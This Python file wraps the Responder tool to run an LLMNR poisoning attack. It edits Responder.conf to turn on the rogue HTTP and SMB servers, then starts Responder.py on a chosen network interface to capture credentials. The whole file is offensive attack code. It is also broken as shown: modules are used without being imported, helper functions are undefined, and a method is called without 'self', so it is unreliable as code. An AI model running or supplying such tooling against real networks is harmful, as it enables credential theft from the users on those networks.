#!/usr/bin/env python3

class Responder:


    def edit_responder_conf(self, switch, protocols):
        """Edit responder.conf"""
        if switch == 'On':
            opp_switch = 'Off'
        else:
            opp_switch = 'On'
        conf = 'submodules/Responder/Responder.conf'
        with open(conf, 'r') as f:
            filedata = f.read()
        for p in protocols:
            # Make sure the change we're making is necessary
            if re.search(p + ' = ' + opp_switch, filedata):
                filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
        with open(conf, 'w') as f:
            f.write(filedata)


    def start_responder(self, iface):
        """Start Responder alone for LLMNR attack"""
        edit_responder_conf('On', ['HTTP', 'SMB'])
        resp_cmd = '{}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
        resp_proc = run_proc(resp_cmd)
        print_info('Responder-Session.log:')
        return resp_proc

